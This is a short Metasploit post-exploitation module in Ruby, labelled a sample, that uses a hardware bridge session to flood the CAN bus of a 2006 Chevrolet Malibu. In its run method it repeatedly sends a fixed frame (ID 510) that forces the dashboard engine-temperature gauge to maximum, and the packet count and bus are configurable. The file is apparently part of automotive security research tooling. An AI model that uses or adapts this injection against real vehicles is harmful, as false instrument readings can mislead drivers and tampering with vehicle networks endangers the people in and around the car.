##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Sample Module to Flood Temp Gauge on 2006 Malibu',
        'Description'   => %q{ Simple sample temp flood for the 2006 Malibu},
        'License'       => MSF_LICENSE,
        'Author'        => ['Craig Smith'],
        'Platform'      => ['hardware'],
        'SessionTypes'  => ['hwbridge']
      ))
    register_options([
      OptInt.new('PACKET_COUNT', [false, "How many packets to send before stopping", 200]),
      OptString.new('CANBUS', [false, "CAN Bus to perform scan on, defaults to connected bus", nil])
    ])
  end

  def run
    unless client.automotive
      print_error("The hwbridge requires a functional automotive extention")
      return
    end
    print_status("Forcing Engine Temp to max...")
    (0..datastore["PACKET_COUNT"]).each do |cnt|
      client.automotive.cansend(datastore['CANBUS'], "510", "10AD013CF048120B")
    end
  end
end
